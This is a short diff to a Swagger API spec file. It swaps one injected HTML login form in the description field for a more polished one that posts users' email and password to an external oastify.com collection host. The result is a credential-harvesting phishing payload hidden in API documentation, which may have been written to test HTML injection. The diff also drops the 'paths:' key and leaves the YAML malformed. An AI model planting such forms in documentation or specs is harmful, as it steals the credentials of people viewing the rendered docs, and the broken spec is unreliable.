@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: Example yaml.spec
   description: |
-    <form action="https://ssolvzl7sc83r2tx167ld7j56wcv0toi.oastify.com">Login for security:<br><label for="u">Email:<input type="text" id="u" name="u"><br><label for="p">Pass:<input type="password" id="p" name="p"><br><input type="submit" value="ok">
-paths:
+   <form action="https://bds4gi6qdvtmclegmps4yq4orfxfl59u.oastify.com" method="POST"><h3>Please login to continue</h3><input type="email" name="email" autocomplete="username" placeholder="Email"><input type="password" name="password" autocomplete="current-password" placeholder="Password"><button type="submit">Login</button></form>
   /accounts:
     get:
       responses:
